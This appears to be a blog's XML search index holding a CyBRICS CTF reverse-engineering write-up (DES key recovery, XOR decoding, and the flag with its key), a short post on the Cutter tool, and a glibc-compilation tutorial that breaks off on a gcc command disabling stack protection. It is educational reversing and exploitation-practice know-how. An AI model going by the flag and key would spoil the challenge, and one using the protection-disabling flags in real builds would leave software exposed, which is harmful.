<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Cybrics_Matreshka_Reverse</title>
      <link href="/2019/07/22/Cybrics-Matreshka-Reverse/"/>
      <url>/2019/07/22/Cybrics-Matreshka-Reverse/</url>
      
        <content type="html"><![CDATA[<p>I try to play the Cybrics CTF yesterdayüòÄ‚Ä¶And the truth tell me that how suck i am‚Ä¶ Btw‚Ä¶The challenges of Cybrics is very interesting and fresh.</p><a id="more"></a><h1 id="Cybrics-Matreshka-Reverse"><a href="#Cybrics-Matreshka-Reverse" class="headerlink" title="Cybrics_Matreshka_Reverse"></a>Cybrics_Matreshka_Reverse</h1><blockquote><p>CyBRICS is a computer security competition (CTF) organized in a cross-university effort by BRICS countries academia.</p><p>The event is organized by CyBRICS coordinating universities: <a href="https://en.itmo.ru/en/" target="_blank" rel="noopener">ITMO University</a> (RU), <a href="http://en.scu.edu.cn/" target="_blank" rel="noopener">SiChuan University</a> (CN), <a href="https://www.nitw.ac.in/" target="_blank" rel="noopener">NIT Warangal</a> (IN), <a href="http://www.iitkgp.ac.in/" target="_blank" rel="noopener">IIT Kharagpur</a> (IN), <a href="https://www.wits.ac.za/" target="_blank" rel="noopener">Wits University</a> (ZA), <a href="https://www.tut.ac.za/" target="_blank" rel="noopener">Tshwane University of Technology</a> (ZA).</p><p>The competition is made and run by <a href="https://vk.com/spbctf" target="_blank" rel="noopener">SPbCTF</a> meetups crew (members of CTF teams LC‚ÜØBC, SiBears, PeterPEN, Yozik).</p></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722151354.png" alt=""></p><h2 id="Challenge-Matreshka"><a href="#Challenge-Matreshka" class="headerlink" title="Challenge_Matreshka"></a>Challenge_Matreshka</h2><p>Although it is easy for most individuals, i think it‚Äôs valuable.</p><p>appendix: <code>Code2.class</code> and <code>data2.bin</code></p><h2 id="Step1-Java-analysis"><a href="#Step1-Java-analysis" class="headerlink" title="Step1: Java analysis"></a>Step1: Java analysis</h2><p>You can get the source code from Code2.class by the <code>jd-gui</code> or other tools like it.</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>PrintStream<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>Cipher<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKey<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>SecretKeyFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span>DESKeySpec<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Code2</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception  <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfByte<span class="token punctuation">,</span> String paramString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    SecretKeyFactory localSecretKeyFactory <span class="token operator">=</span> SecretKeyFactory<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> paramString<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DESKeySpec localDESKeySpec <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DESKeySpec</span><span class="token punctuation">(</span>arrayOfByte1<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey localSecretKey <span class="token operator">=</span> localSecretKeyFactory<span class="token punctuation">.</span><span class="token function">generateSecret</span><span class="token punctuation">(</span>localDESKeySpec<span class="token punctuation">)</span><span class="token punctuation">;</span>    Cipher localCipher <span class="token operator">=</span> Cipher<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localCipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> localSecretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> localCipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>paramArrayOfByte<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> arrayOfByte2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayOfByte2<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arrayOfByte1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Then you can know the <code>data.bin</code> is actually encoded‚Ä¶ So how to decode it and get the <code>stage2.bin</code>?</p><p>Obviously, the value of ‚Äúuser.name‚Äù is the key‚Ä¶Make sure it is the property of challenge environmentÔºånot our computer‚Äôs ‚Äúuser.name‚Äù‚Ä¶</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//...Ellipsis</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> paramArrayOfString<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String str <span class="token operator">=</span> <span class="token string">"matreha!"</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte1 <span class="token operator">=</span> <span class="token function">encode</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte2 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    String username <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte2<span class="token punctuation">,</span><span class="token string">"matreha!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    File localFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"data.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    FileInputStream localFileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>localFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>localFile<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arrayOfByte4 <span class="token operator">=</span> <span class="token function">decode</span><span class="token punctuation">(</span>arrayOfByte3<span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>    FileOutputStream localFileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"stage2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>arrayOfByte4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arrayOfByte4<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    localFileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//...</span></code></pre><p>Then compile the program and run it‚Ä¶</p><h2 id="Step2-Golang-analysis"><a href="#Step2-Golang-analysis" class="headerlink" title="Step2: Golang analysis"></a>Step2: Golang analysis</h2><p>You have got the <code>stage2.bin</code> from step1.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722154552.png" alt=""></p><p>According to the combination of static analysis and dynamic analysis, we can know the program logic as followsÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722205942.png" alt=""></p><p>It should be noted that when XOR reaches the last byte, the loop produces some differences, and it is easy to ignore the key of the last byte, but this byte can be inferred‚Ä¶‚Ä¶</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722210542.png" alt=""></p><p>Dynamically debuggingÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211126.png" alt=""></p><p>The R8 stores the key byte that we should get‚Ä¶RSI stores our directory string‚Ä¶There is seventeen key bytes totally‚Ä¶After getting all the key bytes, just xor it with the Built-in ciphertext‚Ä¶</p><p><code>Built-in ciphertext(hex)</code>:0x53ddc587e46399144fa4142dc42404c0b0</p><p><code>Key(hex)</code>:0x38afaaf48c08f84b22c5605fa1576cabd1</p><pre class=" language-python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2sIn <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> n2s<span class="token punctuation">(</span><span class="token number">0x53ddc587e46399144fa4142dc42404c0b0</span><span class="token operator">^</span><span class="token number">0x38afaaf48c08f84b22c5605fa1576cabd1</span><span class="token punctuation">)</span>Out<span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'kroshka_matreshka'</span></code></pre><p>Then i mv the program in a directory named ‚Äòkroshka_matreshka‚Äô and run it‚Ä¶A result.pyc‚Ä¶wellüòé</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211935.png" class="lazyload"></p><p>ApparentlyÔºåwe arrived hereÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190722211827.png" class="lazyload"></p><h2 id="Step3ÔºöPython-analysis"><a href="#Step3ÔºöPython-analysis" class="headerlink" title="Step3ÔºöPython analysis"></a>Step3ÔºöPython analysis</h2><p>Decompiling <code>result.pyc</code>, then you can see the logic from source code‚Ä¶This is an eight-byte key cycle XOR encryption algorithm.</p><p>You have known the flag is begin with <code>cybrics{</code>Ôºåso you can directly get the keyÔºö<code>Kr0H4137</code>Ôºåthen you just get flag by decrypting the ciphertext‚Ä¶üÜó</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> result <span class="token keyword">import</span> <span class="token operator">*</span>Enter key to get flag<span class="token punctuation">:</span>Kr0H4137cybrics<span class="token punctuation">{</span>M4TR35HK4_15_B35T<span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span></code></pre><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p>It‚Äôs a nice and full day!üòÑ</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Reverse </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Awesome_Cutter_radare2</title>
      <link href="/2019/07/21/Awesome-Cutter-radare2/"/>
      <url>/2019/07/21/Awesome-Cutter-radare2/</url>
      
        <content type="html"><![CDATA[<p>Cutter is a free and open-source GUI for radare2 reverse engineering framework. Its goal is making an advanced, customizable and FOSS reverse-engineering platform while keeping the user experience at mind. Cutter is created by reverse engineers for reverse engineersüòé.</p><a id="more"></a><p>Github repository link: <a href="https://github.com/radareorg/cutter" target="_blank" rel="noopener">https://github.com/radareorg/cutter</a></p><p>Instruction doc linkÔºö<a href="https://cutter.re/docs/" target="_blank" rel="noopener">https://cutter.re/docs/</a></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190721170055.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Compile_Glibc_Manually</title>
      <link href="/2019/07/20/Manually-Compile-Glibc/"/>
      <url>/2019/07/20/Manually-Compile-Glibc/</url>
      
        <content type="html"><![CDATA[<p>If you want to learn some fantastic and advance technique about Security, You have to command some fundamental knowledge‚Ä¶‚Ä¶</p> <a id="more"></a><h1 id="Compile-Glibc-Manually"><a href="#Compile-Glibc-Manually" class="headerlink" title="Compile_Glibc_Manually"></a>Compile_Glibc_Manually</h1><blockquote><p>Today i will show you how to compile a glibc manually.</p></blockquote><h2 id="What-is-Glibc"><a href="#What-is-Glibc" class="headerlink" title="What is Glibc?"></a>What is Glibc?</h2><p>Refer from the <code>stack overflow</code>:<a href="https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for" target="_blank" rel="noopener">https://stackoverflow.com/questions/11460782/what-is-glibc-what-is-it-used-for</a></p><blockquote><p>It‚Äôs the implementation of <em>Standard C library</em> described in C standards plus some extra useful stuffs which are not strictly standard but used frequently.</p><p>Its main contents are :</p><p>1) C library described in ANSI,c99,c11 standards. It includes macros, symbols, function implementations etc.(printf(),malloc() etc)</p><p>2) POSIX standard library. The ‚Äúuserland‚Äù glue of system calls. (open(),read() etc. Actually glibc does not ‚Äúimplement‚Äù system calls. kernel does it. But glibc provides the user land interface to the services provided by kernel so that user application can use a system call just like a ordinary function.</p><p>3) Also some nonstandard but useful stuff.</p><p>‚Äúuse the force, read the source ‚Äú</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$git</span> clone git://sourceware.org/git/glibc.git</code></pre></blockquote><h2 id="What-is-ld-so"><a href="#What-is-ld-so" class="headerlink" title="What is ld.so?"></a>What is ld.so?</h2><p>ld.so : Dynamic linker of system‚Ä¶Used for Executed-file like a.out</p><p>ld-linux.so: Dynamic linker of linux‚Ä¶Used for ELF format Executed-file.</p><pre class=" language-bash"><code class="language-bash"> ‚úò ‚ö° root@xiaoyifeng ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file ./elf/ld-linux-x86-64.so.2</span>./elf/ld-linux-x86-64.so.2: symbolic <span class="token function">link</span> to ld.so</code></pre><h2 id="What-is-libc-so"><a href="#What-is-libc-so" class="headerlink" title="What is libc.so?"></a>What is libc.so?</h2><p>libc.so : Glibc binary is called libc.so.6</p><p>Actually libc.so.6 is a symbolic link to libc.so‚Ä¶‚Ä¶ </p><pre class=" language-bash"><code class="language-bash"> ‚ö° root@xiaoyifeng ÓÇ∞ ~/glibc_source/glibc2.23_build <span class="token comment" spellcheck="true"># file libc.so.6</span>libc.so.6: symbolic <span class="token function">link</span> to libc.so</code></pre><p><a href="https://stackoverflow.com/questions/11372872/what-is-the-role-of-libcglibc-in-our-linux-app" target="_blank" rel="noopener">What is libc?</a></p><h2 id="Compiling-it"><a href="#Compiling-it" class="headerlink" title="Compiling it!"></a>Compiling it!</h2><blockquote><p>Reference:<a href="https://www.jianshu.com/p/ee1ad4044ef7" target="_blank" rel="noopener">https://www.jianshu.com/p/ee1ad4044ef7</a></p></blockquote><p>Before compile itÔºåyou should download the special glibc source code and uncompressed it‚Ä¶‚Ä¶Then you should mkdir two another directory called for build and compiling file‚Ä¶‚Ä¶like this:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720155219.png" alt=""></p><h3 id="Step1-configure"><a href="#Step1-configure" class="headerlink" title="Step1:configure"></a>Step1:configure</h3><p>It‚Äôs important to add <code>--disable-werror</code>‚Ä¶‚Ä¶</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720152708.png" alt=""></p><h3 id="Step2-make"><a href="#Step2-make" class="headerlink" title="Step2: make"></a>Step2: make</h3><p>Maybe you would encounter this bad problem. : <code>can&#39;t be versioned to common symbol &#39;loc1&#39;</code></p><p>Just find the solution in this page : <a href="https://www.e-learn.cn/content/qita/664508" target="_blank" rel="noopener">https://www.e-learn.cn/content/qita/664508</a></p><pre class=" language-c"><code class="language-c"><span class="token operator">--</span><span class="token operator">-</span> a<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c<span class="token operator">++</span><span class="token operator">+</span> b<span class="token operator">/</span>misc<span class="token operator">/</span>regexp<span class="token punctuation">.</span>c@@ <span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">14</span> <span class="token operator">+</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">15</span> @@ <span class="token macro property">#<span class="token directive keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_23)</span><span class="token operator">-</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1<span class="token punctuation">;</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment" spellcheck="true">/* Define the variables used for the interface.  Avoid .symver on common+   symbol, which just creates a new common symbol, not an alias.  */</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc1 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>loc2 <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> loc1<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> loc2<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* Although we do not support the use we define this variable as well.  */</span><span class="token operator">-</span><span class="token keyword">char</span> <span class="token operator">*</span>locs<span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">char</span> <span class="token operator">*</span>locs <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>nocommon<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">compat_symbol</span> <span class="token punctuation">(</span>libc<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> locs<span class="token punctuation">,</span> GLIBC_2_0<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Just add <code>__attribute__ ((nocommon))</code> behind the <code>*loc</code>Ôºåthen you can solve this error;</p><h3 id="step3-make-install"><a href="#step3-make-install" class="headerlink" title="step3: make install"></a>step3: make install</h3><p>After <code>make install</code>, you can find the libc.so compiled by yourself in build directory, and ld.so is in elf directory.</p><h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes:"></a>Notes:</h3><p>Although the same version of libc may also have diffrent offset because of the diffrent args in compiling time.</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190720154352.png" alt=""></p><h2 id="Using-The-Compiled-Glibc-To-Compile-Program"><a href="#Using-The-Compiled-Glibc-To-Compile-Program" class="headerlink" title="Using The Compiled Glibc To Compile Program"></a>Using The Compiled Glibc To Compile Program</h2><p><code>Instructions</code>:</p><pre class=" language-bash"><code class="language-bash">gcc -g -fno-stack-protector -z execstack size_over.c -o size_over -Wl,--rpath<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/ -Wl,--dynamic-linker<span class="token operator">=</span>/root/glibc_source/glibc2.23_build/elf/ld-linux-x86-64.so.2</code></pre><p><code>compile 